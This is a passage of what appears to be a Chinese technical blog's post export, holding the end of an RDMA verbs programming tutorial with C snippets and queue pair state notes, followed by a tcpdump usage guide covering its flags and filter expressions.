<li>查询RDMA设备端口信息(ibv_query_port ibv_port_attr)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 4 查询设备端口状态 */</span></span><br><span class="line"><span class="keyword">if</span> (ibv_query_port(res.ib_ctx, <span class="number">1</span>, &amp;res.port_attr))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ibv_query_port on port failed\n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>分配一个Protection Domain (ibv_alloc_pd ibv_pd)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 5 创建PD（Protection Domain） */</span></span><br><span class="line">res.pd = ibv_alloc_pd(res.ib_ctx);</span><br><span class="line"><span class="keyword">if</span> (!res.pd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ibv_alloc_pd failed\n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>创建一个Complete Queue (ibv_create_cq ibv_cq)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6 创建CQ（Complete Queue） */</span></span><br><span class="line"><span class="type">int</span> cq_size = <span class="number">10</span>;</span><br><span class="line">res.cq = ibv_create_cq(res.ib_ctx, cq_size, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!res.cq)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create CQ with %u entries\n&quot;</span>, cq_size);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>注册一块Memory Region (ibv_reg_mr ibv_mr)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7 注册MR（Memory Region） */</span></span><br><span class="line"><span class="type">int</span> size = MSG_SIZE;</span><br><span class="line">res.buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> (!res.buf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to malloc %Zu bytes to memory buffer\n&quot;</span>, size);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(res.buf, <span class="number">0</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mr_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;</span><br><span class="line">res.mr = ibv_reg_mr(res.pd, res.buf, size, mr_flags);</span><br><span class="line"><span class="keyword">if</span> (!res.mr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ibv_reg_mr failed with mr_flags=0x%x\n&quot;</span>, mr_flags);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;MR was registered with addr=%p, lkey=0x%x, rkey=0x%x, flags=0x%x\n&quot;</span>,</span><br><span class="line">res.buf, res.mr-&gt;lkey, res.mr-&gt;rkey, mr_flags);</span><br></pre></td></tr></table></figure></li>
<li>创建一个Queue Pair (ibv_create_qp ibv_qp)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8 创建QP（Queue Pair） */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_qp_init_attr</span> <span class="title">qp_init_attr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;qp_init_attr, <span class="number">0</span>, <span class="keyword">sizeof</span>(qp_init_attr));</span><br><span class="line">qp_init_attr.qp_type = IBV_QPT_RC;</span><br><span class="line">qp_init_attr.sq_sig_all = <span class="number">1</span>;</span><br><span class="line">qp_init_attr.send_cq = res.cq;</span><br><span class="line">qp_init_attr.recv_cq = res.cq;</span><br><span class="line">qp_init_attr.cap.max_send_wr = <span class="number">1</span>;</span><br><span class="line">qp_init_attr.cap.max_recv_wr = <span class="number">1</span>;</span><br><span class="line">qp_init_attr.cap.max_send_sge = <span class="number">1</span>;</span><br><span class="line">qp_init_attr.cap.max_recv_sge = <span class="number">1</span>;</span><br><span class="line">res.qp = ibv_create_qp(res.pd, &amp;qp_init_attr);</span><br><span class="line"><span class="keyword">if</span> (!res.qp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to create QP\n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;QP was created, QP number=0x%x\n&quot;</span>, res.qp-&gt;qp_num);</span><br></pre></td></tr></table></figure></li>
<li>交换控制信息 (使用Socket)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9 交换控制信息 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cm_con_data_t</span> <span class="title">local_con_data</span>;</span>  <span class="comment">// 发送给远程主机的信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cm_con_data_t</span> <span class="title">remote_con_data</span>;</span> <span class="comment">// 接收远程主机发送过来的信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cm_con_data_t</span> <span class="title">tmp_con_data</span>;</span></span><br><span class="line"></span><br><span class="line">local_con_data.addr = htonll((<span class="type">uintptr_t</span>)res.buf);</span><br><span class="line">local_con_data.rkey = htonl(res.mr-&gt;rkey);</span><br><span class="line">local_con_data.qp_num = htonl(res.qp-&gt;qp_num);</span><br><span class="line">local_con_data.lid = htons(res.port_attr.lid);</span><br><span class="line"><span class="keyword">if</span> (sock_sync_data(server_ip, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">cm_con_data_t</span>), (<span class="type">char</span> *)&amp;local_con_data, (<span class="type">char</span> *)&amp;tmp_con_data) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to exchange connection data between sides\n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br><span class="line">remote_con_data.addr = ntohll(tmp_con_data.addr);</span><br><span class="line">remote_con_data.rkey = ntohl(tmp_con_data.rkey);</span><br><span class="line">remote_con_data.qp_num = ntohl(tmp_con_data.qp_num);</span><br><span class="line">remote_con_data.lid = ntohs(tmp_con_data.lid);</span><br><span class="line"><span class="comment">/* save the remote side attributes, we will need it for the post SR */</span></span><br><span class="line">res.remote_props = remote_con_data;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Remote address = 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, remote_con_data.addr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Remote rkey = 0x%x\n&quot;</span>, remote_con_data.rkey);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Remote QP number = 0x%x\n&quot;</span>, remote_con_data.qp_num);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Remote LID = 0x%x\n&quot;</span>, remote_con_data.lid);</span><br></pre></td></tr></table></figure></li>
<li>转换QP状态(ibv_modify_qp)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 10 转换QP状态 */</span></span><br><span class="line"><span class="comment">// RESET -&gt; INIT</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_qp_attr</span> <span class="title">attr</span>;</span></span><br><span class="line"><span class="type">int</span> flags;</span><br><span class="line"><span class="built_in">memset</span>(&amp;attr, <span class="number">0</span>, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">attr.qp_state = IBV_QPS_INIT;</span><br><span class="line">attr.port_num = <span class="number">1</span>; <span class="comment">// IB 端口号</span></span><br><span class="line">attr.pkey_index = <span class="number">0</span>;</span><br><span class="line">attr.qp_access_flags = IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ | IBV_ACCESS_REMOTE_WRITE;</span><br><span class="line">flags = IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS;</span><br><span class="line">rc = ibv_modify_qp(res.qp, &amp;attr, flags);</span><br><span class="line"><span class="keyword">if</span> (rc)</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to modify QP state to INIT\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//INIT -&gt; RTR(Ready To Receive)</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;attr, <span class="number">0</span>, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">attr.qp_state = IBV_QPS_RTR;</span><br><span class="line">attr.path_mtu = IBV_MTU_256;</span><br><span class="line">attr.dest_qp_num = res.remote_props.qp_num;</span><br><span class="line">attr.rq_psn = <span class="number">0</span>;</span><br><span class="line">attr.max_dest_rd_atomic = <span class="number">1</span>;</span><br><span class="line">attr.min_rnr_timer = <span class="number">0x12</span>;</span><br><span class="line">attr.ah_attr.is_global = <span class="number">0</span>;</span><br><span class="line">attr.ah_attr.dlid = res.remote_props.lid;</span><br><span class="line">attr.ah_attr.sl = <span class="number">0</span>;</span><br><span class="line">attr.ah_attr.src_path_bits = <span class="number">0</span>;</span><br><span class="line">attr.ah_attr.port_num = <span class="number">1</span>;</span><br><span class="line">flags = IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER;</span><br><span class="line">rc = ibv_modify_qp(res.qp, &amp;attr, flags);</span><br><span class="line"><span class="keyword">if</span> (rc)</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to modify QP state to RTR\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//RTR -&gt; RTS(Ready To Send)</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;attr, <span class="number">0</span>, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">attr.qp_state = IBV_QPS_RTS;</span><br><span class="line">attr.timeout = <span class="number">0x12</span>;</span><br><span class="line">attr.retry_cnt = <span class="number">6</span>;</span><br><span class="line">attr.rnr_retry = <span class="number">0</span>;</span><br><span class="line">attr.sq_psn = <span class="number">0</span>;</span><br><span class="line">attr.max_rd_atomic = <span class="number">1</span>;</span><br><span class="line">flags = IBV_QP_STATE | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_SQ_PSN | IBV_QP_MAX_QP_RD_ATOMIC;</span><br><span class="line">rc = ibv_modify_qp(res.qp, &amp;attr, flags);</span><br><span class="line"><span class="keyword">if</span> (rc)</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to modify QP state to RTS\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>状态：RESET -&gt; INIT -&gt; RTR -&gt; RTS</li>
<li>要严格按照顺序进行转换</li>
<li>QP刚创建时状态为RESET</li>
<li>INIT之后就可以调用ibv_post_recv提交一个receive buffer了</li>
<li>当QP进入RTR(ready to receive)状态以后，便开始进行接收处理</li>
<li>RTR之后便可以转为RTS(ready to send)，RTS状态下可以调用ibv_post_send</li>
</ul>
</li>
<li>创建发送任务&#x2F;接收任务(ibv_send_wr&#x2F;ibv_recv_wr)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 11 创建发送任务ibv_send_wr */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_send_wr</span> <span class="title">sr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_sge</span> <span class="title">sge</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_send_wr</span> *<span class="title">bad_wr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> rc;</span><br><span class="line"><span class="comment">/* prepare the scatter/gather entry */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sge, <span class="number">0</span>, <span class="keyword">sizeof</span>(sge));</span><br><span class="line">sge.addr = (<span class="type">uintptr_t</span>)res-&gt;buf;</span><br><span class="line">sge.length = MSG_SIZE;</span><br><span class="line">sge.lkey = res-&gt;mr-&gt;lkey;</span><br><span class="line"><span class="comment">/* prepare the send work request */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sr, <span class="number">0</span>, <span class="keyword">sizeof</span>(sr));</span><br><span class="line">sr.next = <span class="literal">NULL</span>;</span><br><span class="line">sr.wr_id = <span class="number">0</span>;</span><br><span class="line">sr.sg_list = &amp;sge;</span><br><span class="line">sr.num_sge = <span class="number">1</span>;</span><br><span class="line">sr.opcode = opcode;</span><br><span class="line">sr.send_flags = IBV_SEND_SIGNALED;</span><br><span class="line"><span class="keyword">if</span> (opcode != IBV_WR_SEND)</span><br><span class="line">&#123;</span><br><span class="line">    sr.wr.rdma.remote_addr = res-&gt;remote_props.addr;</span><br><span class="line">    sr.wr.rdma.rkey = res-&gt;remote_props.rkey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该任务会被提交到QP中的SQ（Send Queue）中</li>
<li>发送任务有三种操作：Send,Read,Write。Send操作需要对方执行相应的Receive操作；Read&#x2F;Write直接操作对方内存，对方无感知。</li>
<li>把要发送的数据的内存地址，大小，密钥告诉HCA</li>
<li>Read&#x2F;Write还需要告诉HCA远程的内存地址和密钥</li>
</ul>
</li>
<li>提交发送任务&#x2F;接收任务(ibv_post_send&#x2F;ibv_post_recv)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rc = ibv_post_send(res-&gt;qp, &amp;sr, &amp;bad_wr);</span><br><span class="line"><span class="keyword">if</span> (rc)</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to post SR\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> rc;</span><br></pre></td></tr></table></figure></li>
<li>轮询任务完成信息(ibv_poll_cq)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 13 轮询任务结果 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_wc</span> <span class="title">wc</span>;</span></span><br><span class="line"><span class="type">int</span> poll_result;</span><br><span class="line"><span class="type">int</span> rc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    poll_result = ibv_poll_cq(res-&gt;cq, <span class="number">1</span>, &amp;wc);</span><br><span class="line">&#125; <span class="keyword">while</span> (poll_result == <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="QP状态转换"><a href="#QP状态转换" class="headerlink" title="QP状态转换"></a>QP状态转换</h3><p><img src="/images/rdma/rdma_qp_status.jpg" alt="rdma_qp_status"></p>
<h4 id="Reset-State"><a href="#Reset-State" class="headerlink" title="Reset State"></a>Reset State</h4><ol>
<li>该状态为QP新创建时的初始状态</li>
<li>在不删除QP的情况下，仅能通过Modify Queue Pair Attributes verb跳出该状态</li>
<li>该状态下向QP提交WR，将会返回错误，远端到来的消息也会直接被忽略</li>
<li>通过利用verbs修改QP属性，可以将任何状态的QP转换为Reset状态。</li>
</ol>
<h4 id="Initialized-State"><a href="#Initialized-State" class="headerlink" title="Initialized State"></a>Initialized State</h4><ol>
<li>仅能从Reset状态进入该状态</li>
<li>在不删除QP的情况下，仅能通过Modify Queue Pair Attributes verb跳出该状态</li>
<li>该状态下，RQ可以接受WR，但不会处理远端到来的消息，并将到来的消息丢弃</li>
<li>该状态下，向SQ发送WR会返回错误。</li>
</ol>
<h4 id="Ready-To-Receive-RTR-State"><a href="#Ready-To-Receive-RTR-State" class="headerlink" title="Ready To Receive(RTR) State"></a>Ready To Receive(RTR) State</h4><ol>
<li>在RTR状态下，RQ可以接受WR，从远端到来的消息也会正常处理</li>
<li>该状态下，向SQ发送WR会返回错误。</li>
</ol>
<h4 id="Ready-To-Send-RTS-State"><a href="#Ready-To-Send-RTS-State" class="headerlink" title="Ready To Send(RTS) State"></a>Ready To Send(RTS) State</h4><ol>
<li>在RTS状态下，请求端和应答端面向连接的服务类型的通道已经建立</li>
<li>仅能由RTR和SQD状态进入该状态</li>
<li>在不删除QP的情况下，仅能通过Modify Queue Pair Attributes verb跳出该状态</li>
<li>该状态下，向QP发送的WR会被正常处理，发送WR的verb也不会返回错误</li>
<li>该状态下，从远端到来的消息也正常处理。</li>
</ol>
<h4 id="Send-Queue-Drain-SQD-State"><a href="#Send-Queue-Drain-SQD-State" class="headerlink" title="Send Queue Drain(SQD) State"></a>Send Queue Drain(SQD) State</h4><ol>
<li>该状态下，向QP发送的WR会被正常处理，发送WR的verb也不会返回错误</li>
<li>该状态下，从远端到来的消息也正常处理</li>
<li>仅能由RTS进入该状态</li>
<li>当转移到该状态时，未处理的消息不能再处理，未处理完的消息必须处理完</li>
<li>当所有应答都已收到时，如果有事件提醒的请求，则会生成一个附加的异步事件<br> a. 消费者可以利用异步事件来确定状态转移的完成<br> b. 为确保安全的修改QP的属性，必须在接收到异步事件后在进行属性的更改。 </li>
<li>该状态下，提交到QP的WR会入队，但不会被处理</li>
<li>在SQ还没有Drained之前，SQD到RTS的状态转换不被允许，在该状况下转移，CI会报告一个立即的错误。</li>
</ol>
<h4 id="Send-Queue-Error-SQE-State"><a href="#Send-Queue-Error-SQE-State" class="headerlink" title="Send Queue Error(SQE) State"></a>Send Queue Error(SQE) State</h4><ol>
<li>该状态适用于除RC QP之外的所有QP</li>
<li>该状态仅会由RTS跳入，当处理SQ的WR时，发生完成错误(Completion Error)，会造成该转移</li>
<li>在该状态下，RQ可以接受WR，从远端到来的消息也会正常处理</li>
<li>发生了完成错误的WR必须通过CQ返回正确的完成错误码</li>
<li>由于SQ中的WR可能部份或全部执行，因此，接收端的状态是未知的</li>
<li>在SQ中导致完成错误的WR的下一条WR，必须通过CQ返回刷新错误(Flush Error)的完成状态</li>
<li>该状态下，可以通过Modify Queue Pair Attributes verb跳到RTS状态、Reset状态、Error状态。</li>
</ol>
<h4 id="Error-State"><a href="#Error-State" class="headerlink" title="Error State"></a>Error State</h4><ol>
<li>QP上的所有正常处理全部停止</li>
<li>由于WR发生完成错误，导致跳入该状态时，必须通过CQ返回完成错误码</li>
<li>该状态下，从远端收到的数据会被丢弃</li>
<li>在QP中导致完成错误的WR的下一条WR，必须通过CQ返回刷新错误(Flush Error)的完成状态。</li>
</ol>
<h2 id="One-Side-RDMA"><a href="#One-Side-RDMA" class="headerlink" title="One-Side RDMA"></a>One-Side RDMA</h2><ol>
<li>首先A、B建立连接，QP已经创建并且初始化。</li>
<li>数据被存档在A的buffer地址VA，注意VA应该提前注册到A的RNIC，并拿到返回的r_key，相当于RDMA操作这块buffer的权限。</li>
<li>A把数据地址VA，key封装到专用的报文传送到B，这相当于A把数据buffer的操作权交给了B。同时A在它的WQ中注册进一个WR，以用于接收数据传输的B返回的状态。</li>
<li>B在收到A的送过来的数据VA和r_key后，RNIC会把它们连同存储地址VB到封装RDMA READ，这个过程A、B两端不需要任何软件参与，就可以将A的数据存储到B的VB虚拟地址。</li>
<li>B在存储完成后，会向A返回整个数据传输的状态信息。</li>
</ol>
<p>** 单边操作传输方式是RDMA与传统网络传输的最大不同，只需提供直接访问远程的虚拟地址，无须远程应用的参与其中，这种方式适用于批量数据传输。 **</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://blog.csdn.net/BtB5e6Nsu1g511Eg5XEg/article/details/80045487">RDMA技术原理分析、主流实现对比和解析</a></li>
<li><a href="http://rinjilee.com/post_wukan/2019-09-28-RDMA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">RDMA学习笔记</a></li>
<li><a href="http://www.360doc.com/content/19/0126/13/99071_811392560.shtml">详解RDMA架构和技术原理</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/110898225">InfiniBand协议学习</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>kernelbypass</tag>
        <tag>rdma</tag>
      </tags>
  </entry>
  <entry>
    <title>tcpdump用法</title>
    <url>/2017/09/08/network/tcpdump-usage/</url>
    <content><![CDATA[<p><img src="/images/tcpdump/logo.png" alt="tcpdump"></p>
<p><a href="http://www.tcpdump.org/">TcpDump</a>可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p><code>tcpdump &lt;参数s&gt; &lt;包过滤表达式&gt;</code></p>
<ul>
<li>参数<br>  详细请见<code>man tcpdump</code></li>
<li>包过滤表达式<br>  详细请见<code>man pcap-filter</code></li>
</ul>
<h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><ul>
<li><code>-A</code> 以ASCII格式打印出所有分组，并将链路层的头最小化。 </li>
<li><code>-c</code> 在收到指定的数量的分组后，tcpdump就会停止。 </li>
<li><code>-C</code> 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </li>
<li><code>-d</code> 将匹配信息包的代码以人们能够理解的汇编格式给出。 </li>
<li><code>-dd</code> 将匹配信息包的代码以C语言程序段的格式给出。 </li>
<li><code>-ddd</code> 将匹配信息包的代码以十进制的形式给出。 </li>
<li><code>-D</code> 打印出系统中所有可以用tcpdump截包的网络接口。 </li>
<li><code>-e</code> 在输出行打印出数据链路层的头部信息。 </li>
<li><code>-E</code> 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </li>
<li><code>-f</code> 将外部的Internet地址以数字的形式打印出来。 </li>
<li><code>-F</code> 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </li>
<li><code>-i</code> 指定监听的网络接口。 </li>
<li><code>-l</code> 使标准输出变为缓冲行形式，可以把数据导出到文件。 </li>
<li><code>-L</code> 列出网络接口的已知数据链路。 </li>
<li><code>-m</code> 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </li>
<li><code>-M</code> 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </li>
<li><code>-b</code> 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</li>
<li><code>-n</code> 不把网络地址转换成名字。</li>
<li><code>-nn</code> 不进行端口名称的转换。</li>
<li><code>-N</code> 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </li>
<li><code>-t</code> 在输出的每一行不打印时间戳。 </li>
<li><code>-O</code> 不运行分组分组匹配（packet-matching）代码优化程序。 </li>
<li><code>-P</code> 不将网络接口设置成混杂模式。 </li>
<li><code>-q</code> 快速输出。只输出较少的协议信息。 </li>
<li><code>-r</code> 从指定的文件中读取包(这些包一般通过-w选项产生)。 </li>
<li><code>-S</code> 将tcp的序列号以绝对值形式输出，而不是相对值。 </li>
<li><code>-s</code> 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节，一般设置为0，即65535字节。(抓包长度)</li>
<li><code>-T</code> 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </li>
<li><code>-t</code> 不在每一行中输出时间戳。 </li>
<li><code>-tt</code> 在每一行中输出非格式化的时间戳。 </li>
<li><code>-ttt</code> 输出本行和前面一行之间的时间差。 </li>
<li><code>-tttt</code> 在每一行中输出由date处理的默认格式的时间戳。 </li>
<li><code>-u</code> 输出未解码的NFS句柄。 </li>
<li><code>-v</code> 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </li>
<li><code>-vv</code> 输出详细的报文信息。 </li>
<li><code>-w</code> 直接将分组写入文件中，而不是不分析并打印出来。</li>
</ul>
<h2 id="包过滤表达式"><a href="#包过滤表达式" class="headerlink" title="包过滤表达式"></a>包过滤表达式</h2><p>tcpdump利用它作为过滤报文的条件，如果一个报文满足表 达式的条件，则这个报文将会被捕获。如果没有给出任何条件，则网络上所有的信息包 将会被截获。</p>
<p>表达式类型关键字：</p>
<ul>
<li>type<br>  主要包括host，net，port，例如 host 210.27.48.2， 指明 210.27.48.2是一台主机，net 202.0.0.0指明202.0.0.0是一个网络地址，port 23 指明端口号是23。如果没有指定类型，缺省的类型是host。</li>
<li>dir<br>  主要包括src，dst，dst or src，dst and src， 这些关键字指明了传输的方向。举例说明，src 210.27.48.2 ，指明ip包中源地址是 210.27.48.2 ， dst net 202.0.0.0 指明目的网络地址是202.0.0.0。如果没有指明 方向关键字，则缺省是src or dst关键字。</li>
<li>proto<br>  主要包括fddi，ip，arp，rarp，tcp，udp等类型。Fddi指明是在FDDI (分布式光纤数据接口网络)上的特定的网络协议，实际上它是”ether”的别名，fddi和ether 具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和分析。 其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump 将会 监听所有协议的信息包。</li>
</ul>
<p>除了这三种类型的关键字之外，其他重要的关键字如下：gateway， broadcast，less， greater， 还有三种逻辑运算，取非运算是<code>not</code> <code>!</code>，与运算是<code>and</code>，<code>&amp;&amp;</code>，或运算是<code>or</code>，这些关键字可以组合起来构成强大的组合条件来满足人们的需要。</p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h4 id="查看HTTP请求响应头以及数据"><a href="#查看HTTP请求响应头以及数据" class="headerlink" title="查看HTTP请求响应头以及数据"></a>查看HTTP请求响应头以及数据</h4><p><code>sudo tcpdump -A -s 0 &#39;tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)&#39;</code></p>
<p>proto [ expr : size ]<br>Proto 是 ether, fddi, tr, ip, arp, rarp, tcp, udp, icmp or ip6中的一个，它为索引操作指明了协议层。注意，tcp,udp和其他较高层的协议类型只能应用于IPv4，而不能用于IPv6(这个问题可能在将来能得到解决)。被指定的协议层的字节偏移量由expr给出。Size是可选的，它指明了数据域中，我们所感兴趣的字节数。它可以是1，2，或4，默认为1。运算符的长度，由关键字len给出，指明了数据包的长度。<br>例如，<code>ether[0] &amp; 1 != 0</code>会捕捉所有的多播数据流。表达式<code>ip[0] &amp; 0xf != 5</code>能捕捉所有带可选域的IP数据包。表达式<code>ip[6:2] &amp; 0x1fff = 0</code>仅捕捉未分段的数据报和段偏移量是0的数据报。这个检查隐含在tcp和udp的下标操作中。例如，tcp[0]通常指第一个字节的TCP首部，而不是指第一个字节的分段。<br>有些偏移量和域值可以以名字来表示，而不是数值。以下协议首部域的偏移量是正确的：icmptype (ICMP 类型域), icmpcode (ICMP 代码域), and tcpflags (TCP 标志域)。<br>ICMP 类型域有以下这些： icmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert, icmp-routersolicit, icmp-timxceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply, icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply.<br>TCP 标志域有以下这些： tcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-push, tcp-ack, tcp-urg.</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/s_k_yliu/article/details/6665673/">TCPdump抓包命令详解</a></li>
<li><a href="http://www.jianshu.com/p/3cca9a74927c">使用tcpdump查看HTTP请求响应</a></li>
<li><a href="http://www.360doc.com/content/17/0908/11/47158879_685473123.shtml">PCAP数据包过滤器设置 及 过滤表达式语法</a></li>
<li><a href="http://blog.csdn.net/achejq/article/details/7040687">IP头结构详解</a></li>
<li><a href="http://www.jianshu.com/p/ef892323e68f">TCP协议详解</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>tcpdump</tag>
      </tags>
  </entry>
  <entry>
    <title>uWSGI中设置“cap = setuid,setpid”导致python脚本权限降低</title>
    <url>/2016/09/23/uwsgi/uwsgi-config-problem-1/</url>
